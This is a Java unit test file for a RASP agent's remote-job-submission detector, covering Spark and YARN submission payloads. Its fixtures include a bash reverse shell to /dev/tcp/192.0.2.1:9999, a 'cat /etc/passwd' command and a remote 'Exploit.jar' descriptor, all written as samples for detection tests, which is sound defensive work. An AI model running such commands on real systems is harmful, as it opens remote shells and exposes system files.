package io.ohmyrasp.agent.detect;

import static io.ohmyrasp.agent.detect.DetectorTestSupport.assertAlgorithm;
import static io.ohmyrasp.agent.detect.DetectorTestSupport.requestUri;
import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertTrue;

import io.ohmyrasp.agent.model.RequestContext;
import java.util.Map;
import org.junit.jupiter.api.Test;

/** RemoteJobDetector: Remote job submissions. */
final class RemoteJobDetectorTest {
  @Test
  void detectsSparkRemoteJobSubmission() {
    var descriptor =
        """
        {
          "action": "CreateSubmissionRequest",
          "appResource": "https://example.com/jobs/Exploit.jar",
          "mainClass": "Exploit",
          "sparkProperties": {
            "spark.jars": "https://example.com/jobs/Exploit.jar"
          }
        }
        """;
    var context = new RequestContext("POST", "/v1/submissions/create", "", Map.of(), Map.of());

    assertTrue(RemoteJobDetector.detect("Spark REST", descriptor, context, false).isEmpty());
    var result = RemoteJobDetector.detect("Spark REST", descriptor, context, true);

    assertAlgorithm(result, "request_remote_job_submission");
    assertEquals("https", result.orElseThrow().details().get("artifactScheme"));
    assertEquals("jar", result.orElseThrow().details().get("artifactType"));
    assertTrue(result.orElseThrow().requiresExplicitRule());
  }

  @Test
  void yarnCommandDescriptorRequiresExplicitSelection() {
    var descriptor =
        """
        {
          "application-id": "application_1",
          "am-container-spec": {
            "commands": {
              "command": "/bin/bash -i >& /dev/tcp/192.0.2.1/9999 0>&1"
            }
          },
          "application-type": "YARN"
        }
        """;
    var context = new RequestContext("POST", "/ws/v1/cluster/apps", "", Map.of(), Map.of());

    assertTrue(RemoteJobDetector.detect("YARN", descriptor, context, false).isEmpty());
    var result = RemoteJobDetector.detect("YARN", descriptor, context, true);
    assertTrue(result.orElseThrow().requiresExplicitRule());

    assertAlgorithm(result, "request_remote_job_submission");
    assertEquals("44", result.orElseThrow().details().get("commandLength"));
  }

  @Test
  void artifactMetadataDoesNotMaskAnIndependentSchedulerCommandFinding() {
    String descriptor = "{\"appResource\":\"https://reports.invalid/weekly.jar\",\"mainClass\":\"Weekly\","
        + "\"command\":\"cat /etc/passwd\"}";
    var finding = RemoteJobDetector.detect("job", descriptor, requestUri("/jobs/run"), true).orElseThrow();
    assertTrue(finding.details().containsKey("commandLength"));
    assertFalse(finding.requiresExplicitRule());
  }

  @Test
  void ignoresRemoteArtifactOutsideJobSubmissionContext() {
    var descriptor =
        """
        {"appResource":"https://example.com/library.jar","mainClass":"Example"}
        """;

    var result =
        RemoteJobDetector.detect("HTTP JSON", descriptor, requestUri("/repository/upload"), false);

    assertTrue(result.isEmpty());
  }

  @Test
  void ignoresLocalJobSubmissionArtifact() {
    var descriptor =
        """
        {"appResource":"local:///opt/jobs/example.jar","mainClass":"Example"}
        """;

    var result =
        RemoteJobDetector.detect("Spark REST", descriptor, requestUri("/v1/submissions/create"), false);

    assertTrue(result.isEmpty());
  }
}
